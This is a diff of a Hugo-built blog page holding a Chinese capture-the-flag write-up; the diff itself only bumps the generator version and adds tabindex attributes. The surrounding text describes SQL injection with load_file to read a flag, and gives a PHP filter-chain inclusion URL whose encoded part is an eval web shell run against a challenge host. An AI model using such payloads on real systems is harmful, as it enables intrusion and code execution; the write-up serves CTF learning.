@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -269,7 +269,7 @@
 </nav><div class="post-body e-content">
               <h2 id="359度防护网站"><a href="#359度防护网站" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:359度防护网站" class="headings">359度防护网站</a></h2>
 <p>大意了啊，没有扫！来，注！来，waf！就会用SQL欺负我这个练习时长两年半的老lj。。。</p>
-<pre><code>/administrator.html
+<pre tabindex="0"><code>/administrator.html
 /home.php
 /index.php.bak
 /log_in.php
@@ -277,7 +277,7 @@
 /test.php
 </code></pre><p><code>/robots.txt</code>提示了<code>/administrator.html</code>路由，访问<code>/administrator.html</code>，存在一个登录框，复现的话就不搞事情了(滑稽)</p>
 <p>下载index.php.bak得到一个请求体</p>
-<pre><code>GET /important_index_its_so_long_right.php?id=1 HTTP/1.1
+<pre tabindex="0"><code>GET /important_index_its_so_long_right.php?id=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -298,7 +298,7 @@ Upgrade-Insecure-Requests: 1
 </code></pre></td></tr></table></div>
 </div>
 </div><p>访问获得日志记录，base64解码，然后访问<code>up_lo_ad_ad_min.php</code>，看名字是upload，应该是上传，寻找上传点，找不到。。。看了wp才发现原来还有另一个库<code>h1nt</code>，注入得到字段内容：</p>
-<pre><code>1:00001:last_index_come_on_swpu_ctf.php?id=4
+<pre tabindex="0"><code>1:00001:last_index_come_on_swpu_ctf.php?id=4
 </code></pre><p>使用00001登录<code>up_lo_ad_ad_min.php</code>，出现上传点，绕不过，这里应该利用不了。。。不过此时hint字段的页面可以访问了且存在注入，直接<strong>load_file</strong>读取flag。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -453,7 +453,7 @@ Disallow: /index.php?route=pricing</p>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>在<code>contact.action</code>源码中找到一个GET表单，它获得输入后直接将输入值插入html表单而不做任何处理，只有一个html实体化，这样的话我们就可以通过编码绕过然后包含执行。</p>
-<pre><code>http://47.116.79.40:32773/php:%252f/filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFt0eXNraWxsMTFdKTs/Pg%23.action?tyskill11=phpinfo();
+<pre tabindex="0"><code>http://47.116.79.40:32773/php:%252f/filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFt0eXNraWxsMTFdKTs/Pg%23.action?tyskill11=phpinfo();
 </code></pre><p>关键词搜索flag，找到</p>
 <blockquote>
 <p>open_basedir: /var/www/html/f83b25c297736f9df64b448d0cfe9c70:/flag.txt</p>
